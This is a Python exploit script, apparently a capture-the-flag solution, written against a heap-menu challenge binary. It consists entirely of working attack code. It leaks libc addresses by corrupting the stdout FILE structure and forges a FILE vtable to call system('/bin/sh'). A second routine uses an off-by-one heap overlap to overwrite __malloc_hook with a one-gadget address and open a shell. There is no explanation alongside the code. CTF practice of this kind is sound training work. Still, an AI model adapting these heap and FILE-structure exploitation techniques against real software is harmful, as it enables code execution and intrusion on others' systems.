from pwncli import *

cli_script()


def add(p:tube, size:int, data:(str, bytes)="deadbeef\n"):
    p.sendlineafter("5.exit\n", "1")
    p.sendlineafter("Input the size:\n", str(size))
    p.sendafter("Input the content:\n", data)


def delete(p:tube, idx:int):
    p.sendlineafter("5.exit\n", "2")
    p.sendlineafter("Input the index:\n", str(idx))


def update(p:tube, idx:int, size:int, data:(str, bytes)):
    p.sendlineafter("5.exit\n", "4")
    p.sendlineafter("Input the index:\n", str(idx))
    p.sendlineafter("Input size:\n", str(size))
    p.sendafter("Input new content:\n", data)


def attack_by_stdout(p:tube, libc:ELF):
    # leak addr by stdout
    payload = flat(0xfbad1887, 0, 0, 0, "\x58")
    update(p, -16, 0xdead, payload)

    leak_addr = u64(p.recvn(8))
    log_address("leak_addr", leak_addr)
    libc_base_addr = leak_addr - 0x3c56a3
    log_address("libc_base_addr", libc_base_addr)
    libc.address = libc_base_addr

    # hijack IO_XSPUTN to system
    file_str = FileStructure()
    file_str.flags = u64("/bin/sh\x00")
    file_str.vtable = libc.sym["_IO_2_1_stdout_"] + 0x10
    file_str._IO_save_base = libc.sym['system']
    file_str._lock = libc_base_addr + 0x3c6780
    update(p, -16, 0xdead, bytes(file_str))

    p.interactive()


def attack_off_by_one(p:tube, libc:ELF):
    add(p, 0x80) # 0
    add(p, 0x68) # 1
    add(p, 0xf0) # 2
    add(p, 0x20) # 3 gap
    
    # free 0
    delete(p, 0)
    update(p, 1, 0x68, flat({0x60:0x100}, length=0x68))
    delete(p, 2)
    
    add(p, 0x80) # 0
    add(p, 0x68) # 2
    add(p, 0xf0) # 4 

    # again
    delete(p, 0)
    update(p, 2, 0x68, flat({0x60:0x100}, length=0x68))
    delete(p, 4)

    #
    add(p, 0xf0, flat({0x80:[0, 0x71]})) # 0
    add(p, 0xf0) # 4

    delete(p, 0)

    delete(p, 1)
    add(p, 0x80)

    secb = input("Give me the second byte: ")
    payload = p16(((int16(secb)) << 8) + 0xdd)
    update(p, 2, 0x2, payload)

    add(p, 0x60) # 1

    p.sendlineafter("5.exit\n", "1")
    p.sendlineafter("Input the size:\n", str(0x59)) # 1

    p.sendafter("Input the content:", flat(["\x00" * 0x33, 0xfbad1887, 0, 0, 0, "\x58"], filler="\x00"))

    leak_addr = u64(p.recvn(8))
    libc_base_addr = leak_addr - 0x3c56a3
    log_address("libc_base_addr", libc_base_addr)

    delete(p, 1)
    payload = p64(libc.sym['__malloc_hook'] - 0x23 + libc_base_addr)
    update(p, 2, 0x8, payload)

    add(p, 0x60)
    # payload = flat(["\x00" * 11, libc_base_addr + 0xf1147, libc.sym['realloc'] + libc_base_addr], filler="\x00")
    payload = flat(["\x00" * 0x13, libc_base_addr + 0xf1147], filler="\x00")
    add(p, 0x60, payload)

    p.sendlineafter("5.exit\n", "1")
    p.sendlineafter("Input the size:\n", str(0x123)) # 1

    p.interactive()   


attack_by_stdout(gift['io'], gift['libc'])
